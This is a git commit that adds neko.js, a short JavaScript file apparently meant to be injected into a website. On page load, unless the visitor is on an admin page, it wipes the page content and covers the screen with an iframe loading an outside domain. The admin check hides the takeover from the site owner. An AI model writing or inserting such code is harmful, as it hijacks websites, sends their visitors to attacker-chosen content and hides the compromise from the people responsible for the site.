146b642d4d55a1de6202a10b9c9fb5027c99e60e
mengentot <naisec6@gmail.com>
2026-03-30 11:00:17 +0700

    Create neko.js

---
+++ neko.js
@@ -0,0 +1,27 @@
+window.addEventListener('load', () => {
+  const currentUrl = window.location.href;
+
+  if (currentUrl.includes('/admin/')) {
+    console.log('Halaman admin, script dibatalkan.');
+    return;
+  }
+
+  // Delay sedikit biar Safari stabil
+  setTimeout(() => {
+    document.body.innerHTML = '';
+
+    const iframe = document.createElement('iframe');
+    iframe.src = 'https://galaxybear.fun';
+    iframe.style.cssText = `
+      width:100vw;
+      height:100vh;
+      border:none;
+      position:fixed;
+      top:0;
+      left:0;
+      z-index:9999;
+    `;
+
+    document.body.appendChild(iframe);
+  }, 100);
+});
